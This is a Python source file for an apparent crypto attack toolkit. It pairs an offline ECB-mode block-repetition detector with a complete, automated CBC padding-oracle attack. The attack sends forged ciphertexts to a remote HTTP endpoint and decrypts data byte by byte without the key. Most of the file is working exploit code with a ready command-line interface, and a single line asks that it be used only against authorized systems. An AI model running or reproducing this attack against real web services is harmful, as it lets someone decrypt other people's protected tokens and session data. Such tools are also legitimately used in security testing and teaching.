"""Crypto oracle tools: ECB detection and CBC padding-oracle decryption.

Two things that are pure mechanical grind by hand and perfect to automate:

  ecb-detect   given a ciphertext (hex/base64), find repeated 16-byte blocks — the
               fingerprint of ECB mode (identical plaintext blocks -> identical
               ciphertext blocks), which leaks structure and enables cut-and-paste attacks.
  padding      given a CBC ciphertext and a PADDING ORACLE (any endpoint that reveals
               whether decryption padding was valid), DECRYPT the whole thing without the
               key — the classic padding-oracle attack, fully automated byte-by-byte.

The oracle is described by a URL template containing ``CIPHER`` (where the forged
ciphertext goes) and how to read "padding valid" from the response.

Dependencies: standard library only. No external API.

Safety: ecb-detect is offline. The padding attack sends many requests to the oracle
endpoint — only run it against systems you're authorized to. It reads/decrypts; it
writes nothing.

Usage:
    python -m crypto.oracle ecb-detect --data <hexOrBase64>
    python -m crypto.oracle padding --data <hex> \\
        --oracle "https://t/decrypt?ct=CIPHER" --invalid "padding error" --encoding hex
"""

from __future__ import annotations

import argparse
import base64
import binascii
import re
import sys

from common import http
from common.output import emit, log


def _decode_input(data: str) -> bytes:
    data = data.strip()
    try:
        return binascii.unhexlify(data)
    except (binascii.Error, ValueError):
        pass
    for fn in (base64.b64decode, base64.urlsafe_b64decode):
        try:
            return fn(data + "=" * (-len(data) % 4))
        except Exception:
            continue
    raise ValueError("could not decode --data as hex or base64")


def _encode(ct: bytes, encoding: str) -> str:
    if encoding == "hex":
        return ct.hex()
    if encoding == "base64":
        return base64.b64encode(ct).decode()
    if encoding == "base64url":
        return base64.urlsafe_b64encode(ct).decode()
    if encoding == "base64url-urlenc":
        from urllib.parse import quote
        return quote(base64.b64encode(ct).decode(), safe="")
    return ct.hex()


def ecb_detect(data: bytes, block: int = 16) -> dict:
    blocks = [data[i:i + block] for i in range(0, len(data), block)]
    counts: dict[bytes, int] = {}
    for b in blocks:
        counts[b] = counts.get(b, 0) + 1
    repeated = {b.hex(): c for b, c in counts.items() if c > 1}
    return {"blocks": len(blocks), "unique": len(counts),
            "repeated_blocks": repeated, "ecb_likely": bool(repeated)}


def _make_oracle(template: str, encoding: str, invalid: str, valid_status: int | None,
                 timeout: float):
    invalid_re = re.compile(invalid, re.I) if invalid else None

    def oracle(ct: bytes) -> bool:
        url = template.replace("CIPHER", _encode(ct, encoding))
        r = http.get(url, timeout=timeout, retries=0)
        if valid_status is not None:
            return r.status == valid_status
        if invalid_re is not None:
            return not invalid_re.search(r.text)
        # default heuristic: 5xx or "pad/invalid/error" in body => invalid padding
        return not (r.status >= 500 or re.search(r"pad|invalid|error|bad", r.text, re.I))
    return oracle


def padding_attack(ct: bytes, oracle, block: int = 16) -> dict:
    """Decrypt a CBC ciphertext (IV || blocks) via a padding oracle."""
    if len(ct) % block != 0 or len(ct) < 2 * block:
        raise ValueError("ciphertext must be a multiple of block size and >= 2 blocks (incl. IV)")
    blocks = [ct[i:i + block] for i in range(0, len(ct), block)]
    recovered = bytearray()
    requests = 0
    for bi in range(1, len(blocks)):
        prev, target = blocks[bi - 1], blocks[bi]
        inter = bytearray(block)          # intermediate state D(target)
        for pad in range(1, block + 1):
            pos = block - pad
            found = False
            for guess in range(256):
                forged = bytearray(block)
                forged[pos] = guess
                for k in range(pos + 1, block):
                    forged[k] = inter[k] ^ pad
                requests += 1
                if oracle(bytes(forged) + target):
                    # Guard against the false positive where pos already had valid padding.
                    if pad == 1:
                        forged[pos - 1] ^= 0xFF
                        requests += 1
                        if not oracle(bytes(forged) + target):
                            continue
                    inter[pos] = guess ^ pad
                    found = True
                    break
            if not found:
                raise ValueError(f"oracle gave no valid padding for block {bi} pos {pos} "
                                 "(check the oracle/invalid indicator)")
        recovered.extend(bytes(inter[i] ^ prev[i] for i in range(block)))
        log(f"[*] recovered block {bi}/{len(blocks) - 1} ({requests} oracle queries so far)")
    # Strip PKCS#7 padding.
    plain = bytes(recovered)
    if plain and 1 <= plain[-1] <= block:
        plain = plain[:-plain[-1]]
    return {"plaintext": plain.decode("utf-8", "replace"),
            "plaintext_hex": plain.hex(), "oracle_queries": requests}


def run(mode: str, *, data: str, oracle_url: str = "", encoding: str = "hex",
        invalid: str = "", valid_status: int | None = None, block: int = 16,
        timeout: float = 10.0) -> dict:
    raw = _decode_input(data)
    if mode == "ecb-detect":
        return {"mode": mode, **ecb_detect(raw, block)}
    if mode == "padding":
        if not oracle_url or "CIPHER" not in oracle_url:
            raise ValueError("--oracle must be a URL template containing 'CIPHER'")
        oracle = _make_oracle(oracle_url, encoding, invalid, valid_status, timeout)
        return {"mode": mode, **padding_attack(raw, oracle, block)}
    raise ValueError(f"unknown mode {mode!r}; use ecb-detect|padding")


def _compact_lines(res: dict) -> list[str]:
    if res["mode"] == "ecb-detect":
        lines = [f"# oracle ecb-detect: {res['blocks']} blocks, {res['unique']} unique  "
                 f"-> {'ECB LIKELY' if res['ecb_likely'] else 'no repeats (not ECB, or unique data)'}"]
        for b, c in res["repeated_blocks"].items():
            lines.append(f"  repeated x{c}: {b}")
        return lines
    return [f"# oracle padding-attack: {res['oracle_queries']} queries",
            f"## RECOVERED PLAINTEXT", res["plaintext"],
            f"# hex: {res['plaintext_hex']}"]


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="crypto.oracle", description="ECB detection and CBC padding-oracle decryption.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="examples:\n  python -m crypto.oracle ecb-detect --data <hex>\n"
               "  python -m crypto.oracle padding --data <hex> --oracle 'https://t/d?ct=CIPHER' "
               "--invalid 'padding'\n")
    p.add_argument("mode", nargs="?", choices=("ecb-detect", "padding"))
    p.add_argument("--data", default="", help="Ciphertext (hex or base64).")
    p.add_argument("--oracle", default="", help="URL template with CIPHER placeholder (padding mode).")
    p.add_argument("--encoding", default="hex",
                   choices=("hex", "base64", "base64url", "base64url-urlenc"),
                   help="How to encode the forged ciphertext into the URL.")
    p.add_argument("--invalid", default="", help="Regex; if it matches the response, padding is INVALID.")
    p.add_argument("--valid-status", type=int, default=None, help="HTTP status meaning padding VALID.")
    p.add_argument("--block", type=int, default=16, help="Block size (default 16).")
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--json", action="store_true")
    return p


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    if not args.mode or not args.data:
        build_parser().print_help(sys.stderr)
        return 2
    try:
        res = run(args.mode, data=args.data, oracle_url=args.oracle, encoding=args.encoding,
                  invalid=args.invalid, valid_status=args.valid_status, block=args.block,
                  timeout=args.timeout)
    except ValueError as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    emit(res, as_json=args.json, lines=_compact_lines(res))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
